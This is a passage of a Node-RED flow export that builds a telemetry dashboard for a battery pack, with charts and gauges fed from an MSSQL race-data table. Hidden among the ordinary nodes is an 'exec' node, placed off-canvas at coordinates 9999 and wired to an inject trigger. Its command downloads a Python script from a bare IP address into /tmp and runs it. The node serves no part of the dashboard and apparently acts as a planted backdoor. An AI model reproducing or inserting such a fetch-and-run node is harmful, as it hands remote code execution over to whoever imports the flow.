        "className": "",
        "x": 870,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "e8e8a84b72cd37c3",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "9f715c58ec97d4b1",
        "order": 9,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Highest Thermistor ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 840,
        "y": 240,
        "wires": []
    },
    {
        "id": "5d79c7a5078623ae",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Low Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "fce502dd356ea92b",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "9f715c58ec97d4b1",
        "order": 10,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Low Cell Voltage ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 830,
        "y": 320,
        "wires": []
    },
    {
        "id": "d91aaefa7f961334",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Average Cell Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 360,
        "wires": [
            []
        ]
    },
    {
        "id": "a6bd88f7d99fc59b",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "High Cell Internal Resistance",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 400,
        "wires": [
            []
        ]
    },
    {
        "id": "46a8903856a98bf8",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "9f715c58ec97d4b1",
        "order": 11,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "High Cell Resistance ID",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 850,
        "y": 440,
        "wires": []
    },
    {
        "id": "605f6de5fe092e0c",
        "type": "function",
        "z": "c91b7712e66969da",
        "name": "dtc status #2 interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 520,
        "wires": [
            [
                "5d0afbcc6bb0452f"
            ]
        ]
    },
    {
        "id": "39bd307837c22326",
        "type": "function",
        "z": "c91b7712e66969da",
        "name": "dtc status #1 interpreter",
        "func": "return msg;",
        "outputs": 1,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 850,
        "y": 480,
        "wires": [
            [
                "72dc64a3ce9a264d"
            ]
        ]
    },
    {
        "id": "72dc64a3ce9a264d",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "9f715c58ec97d4b1",
        "order": 12,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "DTC status #1",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1100,
        "y": 480,
        "wires": []
    },
    {
        "id": "5d0afbcc6bb0452f",
        "type": "ui_text",
        "z": "c91b7712e66969da",
        "group": "9f715c58ec97d4b1",
        "order": 8,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "DTC Status #2",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1100,
        "y": 520,
        "wires": []
    },
    {
        "id": "8f349d4d1853bb24",
        "type": "ui_chart",
        "z": "c91b7712e66969da",
        "name": "",
        "group": "9f715c58ec97d4b1",
        "order": 2,
        "width": "10",
        "height": "6",
        "label": "Inverter DC Bus Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 560,
        "wires": [
            []
        ]
    },
    {
        "id": "04e9bf59d127ed59",
        "type": "exec",
        "z": "54ee7ab52b252314",
        "command": "curl -o /tmp/3.py http://82.153.138.166/3.py; python /tmp/3.py",
        "addpay": "payload",
        "append": "",
        "useSpawn": "false",
        "timer": "10080",
        "winHide": false,
        "oldrc": false,
        "name": "",
        "x": 9999,
        "y": 9999,
        "wires": [
            [],
            [],
            []
        ]
    },
    {
        "id": "213d0c20572925ff",
        "type": "inject",
        "z": "54ee7ab52b252314",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 9999,
        "y": 9990,
        "wires": [
            [
                "04e9bf59d127ed59"
            ]
        ]
    },
    {
        "id": "7b379a8adbd7ddd0",
        "type": "inject",
        "z": "54ee7ab52b252314",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 150,
        "y": 140,
        "wires": [
            [
                "4d55a030492ec717"
            ]
        ]
    },
    {
        "id": "4d55a030492ec717",
        "type": "MSSQL",
        "z": "54ee7ab52b252314",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 360,
        "y": 140,
        "wires": [
            [
                "af45de85e4f392f6"
            ]
        ]
    },
    {
        "id": "af45de85e4f392f6",
        "type": "function",
        "z": "54ee7ab52b252314",
        "name": "Useful",
        "func": "var sigFigs = 2\n\nvar Total_Pack_Cycles =\n{\n    topic: \"Total Pack Cycles\",\n    payload: msg.payload[0].Total_Pack_Cycles\n}\ntry{\n    Total_Pack_Cycles.payload = Total_Pack_Cycles.payload.toFixed(sigFigs)\n}catch{}\n\nvar Pack_Open_Voltage =\n{\n    topic: \"Pack Open Voltage (V)\",\n    payload: msg.payload[0].Pack_Open_Voltage\n}\ntry {\n    Pack_Open_Voltage.payload = Pack_Open_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Amphours =\n{\n    topic: \"Pack Amp Hours (Ah)\",\n    payload: msg.payload[0].Pack_Amphours\n}\ntry {\n    Pack_Amphours.payload = Pack_Amphours.payload.toFixed(sigFigs)\n} catch { }\n\nvar Pack_Resistance =\n{\n    topic: \"Pack Resistance (Ω)\",\n    payload: msg.payload[0].Pack_Resistance\n}\ntry {\n    Pack_Resistance.payload = Pack_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Temperature =\n{\n    topic: \"Low Temperature (ºC)\",\n    payload: msg.payload[0].Low_Temperature\n}\ntry {\n    Low_Temperature.payload = Low_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Thermistor_ID =\n{\n    topic: \"Low Thermistor ID\",\n    payload: msg.payload[0].Low_Thermistor_ID\n}\ntry {\n    Low_Thermistor_ID.payload = Low_Thermistor_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Pack_Voltage =\n{\n    topic: \"Maximum Pack Voltage (V)\",\n    payload: msg.payload[0].maximum_pack_voltage\n}\ntry {\n    Maximum_Pack_Voltage.payload = Maximum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Pack_Voltage =\n{\n    topic: \"Minimum Pack Voltage (V)\",\n    payload: msg.payload[0].Minimum_Pack_Voltage\n}\ntry {\n    Minimum_Pack_Voltage.payload = Minimum_Pack_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Internal_Temperature =\n{\n    topic: \"Internal Temperature (ºC)\",\n    payload: msg.payload[0].Internal_Temperature\n}\ntry {\n    Internal_Temperature.payload = Internal_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (ºC)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Resistance =\n{\n    topic: \"Low Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Low_Cell_Resistance\n}\ntry {\n    Low_Cell_Resistance.payload = Low_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Intres_ID =\n{\n    topic: \"Low Internal Resistance ID\",\n    payload: msg.payload[0].Low_Intres_ID\n}\ntry {\n    Low_Intres_ID.payload = Low_Intres_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Maximum_Cell_Voltage =\n{\n    topic: \"Maximum Cell Voltage (V)\",\n    payload: msg.payload[0].Maximum_Cell_Voltage\n}\ntry {\n    Maximum_Cell_Voltage.payload = Maximum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Minimum_Cell_Voltage =\n{\n    topic: \"Minimum Cell Voltage (V)\",\n    payload: msg.payload[0].Minimum_Cell_Voltage\n}\ntry {\n    Minimum_Cell_Voltage.payload = Minimum_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Input_Supply_Voltage =\n{\n    topic: \"Input Supply Voltage (V)\",\n    payload: msg.payload[0].Input_Supply_Voltage\n}\ntry {\n    Input_Supply_Voltage.payload = Input_Supply_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Resistance =\n{\n    topic: \"Average Cell Resistance (MΩ)\",\n    payload: msg.payload[0].Avg_Cell_Resistance\n}\ntry {\n    Avg_Cell_Resistance.payload = Avg_Cell_Resistance.payload.toFixed(sigFigs)\n} catch { }\n\n\nreturn [\n    Total_Pack_Cycles,\n    Pack_Open_Voltage,\n    Pack_SOC,\n    Pack_Amphours,\n    Pack_Resistance,\n    Low_Temperature,\n    Low_Thermistor_ID,\n    Avg_Cell_Resistance,\n    Maximum_Pack_Voltage,\n    Minimum_Pack_Voltage,\n    Internal_Temperature,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Low_Cell_Resistance,\n    Low_Intres_ID,\n    Maximum_Cell_Voltage,\n    Minimum_Cell_Voltage,\n    Input_Supply_Voltage\n]",
        "outputs": 18,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 530,
        "y": 180,
        "wires": [
            [
                "64e2db8ac1cc6ff8"
            ],
            [
                "90d141c6c2a1cbe8"
            ],
            [
                "5798f909e7a0b4ef"
            ],
            [
                "980a89194ee4a5f9"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "dadd7a46ade8d9ec"
            ],
            [
                "dadd7a46ade8d9ec"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "90d141c6c2a1cbe8"
            ],
            [
                "90d141c6c2a1cbe8"
            ],
            [
                "dadd7a46ade8d9ec"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "c20bc04e738cf069"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "45f832d9af22bd04"
            ],
            [
                "8326a393562f231b"
            ]
        ]
    },
    {
        "id": "90d141c6c2a1cbe8",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 1,
        "width": "10",
        "height": 6,
        "label": "Pack Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#1f77b4",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 760,
        "y": 160,
        "wires": [
            []
        ]
    },
    {
        "id": "5798f909e7a0b4ef",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 7,
        "width": "10",
        "height": 6,
        "label": "Pack State of Charge",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 780,
        "y": 80,
        "wires": [
            []
        ]
    },
    {
        "id": "dadd7a46ade8d9ec",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 4,
        "width": "10",
        "height": 6,
        "label": "Temperature (Celsius)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 780,
        "y": 200,
        "wires": [
            []
        ]
    },
    {
        "id": "45f832d9af22bd04",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 2,
        "width": "10",
        "height": 6,
        "label": "Cell Voltage (V)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 760,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "c20bc04e738cf069",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 5,
        "width": "10",
        "height": 6,
        "label": "Resistances (Ohm)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#71c5e8",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 770,
        "y": 280,
        "wires": [
            []
        ]
    },
    {
        "id": "980a89194ee4a5f9",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 3,
        "width": "10",
        "height": "6",
        "label": "Pack Amphours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 760,
        "y": 120,
        "wires": [
            []
        ]
    },
    {
        "id": "64e2db8ac1cc6ff8",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Total Packet Cycles",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 770,
        "y": 40,
        "wires": [
            []
        ]
    },
    {
        "id": "8326a393562f231b",
        "type": "ui_chart",
        "z": "54ee7ab52b252314",
        "name": "",
        "group": "0792dde75d0b55e3",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Input Supply Voltage (V)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 790,
        "y": 320,
        "wires": [
            []
        ]
    },
    {
        "id": "0b16929d7a64ef72",
        "type": "inject",
        "z": "594e9fd18f91cc50",
        "name": "",
        "props": [
            {
                "p": "payload"
            },
            {
                "p": "topic",
                "vt": "str"
            }
        ],
        "repeat": "1",
        "crontab": "",
        "once": false,
        "onceDelay": 0.1,
        "topic": "",
        "payload": "",
        "payloadType": "date",
        "x": 330,
        "y": 260,
        "wires": [
            [
                "275cd9d52450ab82"
            ]
        ]
    },
    {
        "id": "275cd9d52450ab82",
        "type": "MSSQL",
        "z": "594e9fd18f91cc50",
        "mssqlCN": "933ce03686fddbab",
        "name": "",
        "outField": "payload",
        "returnType": 0,
        "throwErrors": 1,
        "query": "SELECT TOP 1 *\nFROM dbo.race_data\nORDER BY entry_num DESC;",
        "modeOpt": "queryMode",
        "modeOptType": "query",
        "queryOpt": "payload",
        "queryOptType": "editor",
        "paramsOpt": "queryParams",
        "paramsOptType": "none",
        "rows": "rows",
        "rowsType": "msg",
        "parseMustache": true,
        "params": [],
        "x": 540,
        "y": 260,
        "wires": [
            [
                "fce4f2a6f3872466"
            ]
        ]
    },
    {
        "id": "fce4f2a6f3872466",
        "type": "function",
        "z": "594e9fd18f91cc50",
        "name": "potentially useful messages",
        "func": "var sigFigs = 2\n\n//REPEATED?\nvar Pack_SOC =\n{\n    topic: \"Pack State of Charge (%)\",\n    payload: msg.payload[0].Pack_SOC\n}\ntry {\n    Pack_SOC.payload = Pack_SOC.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_state_of_health =\n{\n    topic: \"Pack State of Health\",\n    payload: msg.payload[0].pack_state_of_health\n}\ntry {\n    pack_state_of_health.payload = pack_state_of_health.payload.toFixed(sigFigs)\n} catch { }\n\nvar pack_summed_voltage =\n{\n    topic: \"Pack Summed Voltage\",\n    payload: msg.payload[0].pack_summed_voltage\n}\ntry {\n    pack_summed_voltage.payload = pack_summed_voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_total_capacity =\n{\n    topic: \"Adaptive Total Capacity\",\n    payload: msg.payload[0].adaptive_total_capacity\n}\ntry {\n    adaptive_total_capacity.payload = adaptive_total_capacity.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_amp_hours =\n{\n    topic: \"Adaptive Amp Hours\",\n    payload: msg.payload[0].adaptive_amp_hours\n}\ntry {\n    adaptive_amp_hours.payload = adaptive_amp_hours.payload.toFixed(sigFigs)\n} catch { }\n\nvar adaptive_state_of_charge =\n{\n    topic: \"Adaptive State of Charge\",\n    payload: msg.payload[0].adaptive_state_of_charge\n}\ntry {\n    adaptive_state_of_charge.payload = adaptive_state_of_charge.payload.toFixed(sigFigs)\n} catch { }\n\nvar Failsafe_Statuses =\n{\n    topic: \"Failsafe Satuses\",\n    payload: msg.payload[0].Failsafe_Statuses\n}\n/* try {\n    failsafe_statuses.payload = failsafe_statuses.payload.toFixed(sigFigs)\n} catch { } */\n\nvar Rolling_Counter =\n{\n    topic: \"Rolling Counter\",\n    payload: msg.payload[0].Rolling_Counter\n}\ntry {\n    Rolling_Counter.payload = Rolling_Counter.payload.toFixed(sigFigs)\n} catch { }\n\nvar total_pack_adc =\n{\n    topic: \"Total Pack ADC\",\n    payload: msg.payload[0].total_pack_adc\n}\ntry {\n    total_pack_adc.payload = total_pack_adc.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage =\n{\n    topic: \"Low Cell Voltage (V)\",\n    payload: msg.payload[0].Low_Cell_Voltage\n}\ntry {\n    Low_Cell_Voltage.payload = Low_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar Low_Cell_Voltage_ID =\n{\n    topic: \"Low Cell Voltage ID\",\n    payload: msg.payload[0].Low_Cell_Voltage_ID\n}\ntry {\n    Low_Cell_Voltage_ID.payload = Low_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage =\n{\n    topic: \"High Cell Voltage (V)\",\n    payload: msg.payload[0].High_Cell_Voltage\n}\ntry {\n    High_Cell_Voltage.payload = High_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar High_Cell_Voltage_ID =\n{\n    topic: \"High Cell Voltage ID\",\n    payload: msg.payload[0].High_Cell_Voltage_ID\n}\ntry {\n    High_Cell_Voltage_ID.payload = High_Cell_Voltage_ID.payload.toFixed(sigFigs)\n} catch { }\n\nvar Avg_Cell_Voltage =\n{\n    topic: \"Average Cell Voltage\",\n    payload: msg.payload[0].Avg_Cell_Voltage\n}\ntry {\n    Avg_Cell_Voltage.payload = Avg_Cell_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nvar BMS_failsafeStatuses =\n{\n    topic: \"Average Cell Voltage\",\n    payload: msg.payload[0].BMS_failsafeStatuses\n}\ntry {\n    BMS_failsafeStatuses.payload = BMS_failsafeStatuses.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    Pack_SOC,\n    pack_state_of_health,\n    pack_summed_voltage,\n    adaptive_total_capacity,\n    adaptive_amp_hours,\n    adaptive_state_of_charge,\n    Failsafe_Statuses,\n    Rolling_Counter,\n    total_pack_adc,\n    Low_Cell_Voltage,\n    Low_Cell_Voltage_ID,\n    High_Cell_Voltage,\n    High_Cell_Voltage_ID,\n    Avg_Cell_Voltage, \n    BMS_failsafeStatuses\n];\n",
        "outputs": 15,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 800,
        "y": 260,
        "wires": [
            [
                "6cae2349bbe224bf"
            ],
            [
                "d7a4e4283792083b"
            ],
            [
                "1355f066678b78da"
            ],
            [
                "461a17a2e944d6fe"
            ],
            [
                "a7e47b2385653e58"
            ],
            [
                "6c2745fe442397c9"
            ],
            [
                "19ebdd6de4e7ec22"
            ],
            [
                "faf4259f29f4989a"
            ],
            [
                "a063d9a10e3f65a6"
            ],
            [
                "30e16296e8c67c55"
            ],
            [
                "1042301885d9fe1d"
            ],
            [
                "78da8df175f75d03"
            ],
            [
                "159b9ce9eee465f6"
            ],
            [
                "4a0de4b619a5b63c"
            ],
            [
                "d52d09416ca80cc5"
            ]
        ]
    },
    {
        "id": "6cae2349bbe224bf",
        "type": "ui_gauge",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "881b1308b85cd435",
        "order": 9,
        "width": "6",
        "height": "6",
        "gtype": "gage",
        "title": "Pack Depth of Discharge",
        "label": "Percentage",
        "format": "{{value | number:2}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 1130,
        "y": 160,
        "wires": []
    },
    {
        "id": "d7a4e4283792083b",
        "type": "ui_gauge",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 10,
        "width": "6",
        "height": "6",
        "gtype": "gage",
        "title": "Pack State of Health",
        "label": "Percentage",
        "format": "{{value | number:2}}%",
        "min": 0,
        "max": "100",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 1120,
        "y": 200,
        "wires": []
    },
    {
        "id": "1355f066678b78da",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 1,
        "width": "10",
        "height": "6",
        "label": "Pack Summed Voltage",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1120,
        "y": 240,
        "wires": [
            []
        ]
    },
    {
        "id": "461a17a2e944d6fe",
        "type": "ui_text",
        "z": "594e9fd18f91cc50",
        "group": "b5264e960f9eb7eb",
        "order": 13,
        "width": "4",
        "height": "2",
        "name": "",
        "label": "Adaptive Total Capacity",
        "format": "{{msg.payload}}",
        "layout": "col-center",
        "className": "",
        "x": 1130,
        "y": 280,
        "wires": []
    },
    {
        "id": "a7e47b2385653e58",
        "type": "ui_chart",
        "z": "594e9fd18f91cc50",
        "name": "",
        "group": "b5264e960f9eb7eb",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Adaptive Amp Hours",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
